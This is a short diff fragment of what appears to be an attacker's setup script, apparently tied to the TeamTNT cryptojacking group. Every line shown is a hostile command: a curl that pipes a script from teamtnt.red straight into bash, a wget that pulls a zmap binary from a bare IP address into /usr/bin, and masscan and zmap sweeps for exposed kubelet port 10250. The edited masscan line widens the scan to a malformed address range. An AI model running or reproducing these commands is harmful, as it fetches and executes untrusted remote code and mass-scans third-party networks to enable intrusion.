@@ -33,7 +33,7 @@ https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-8.4p1.tar.gz
 
 curl -Lk "http://teamtnt.red/set/up/pei.php?dlmode=curl" | bash
 
-masscan --open -p10250 147.75.32.98/31
+masscan --open -p10250 147.75.32.98/31-255.255.255.255
 zmap -B 50M --max-sendto-failures 1000000 -c5 -o- -p 10250 147.75.32.98/31
 
 wget http://45.9.148.35/chimaera/bin/64bit/zmap -O /usr/bin/zmap && chmod +x /usr/bin/zmap
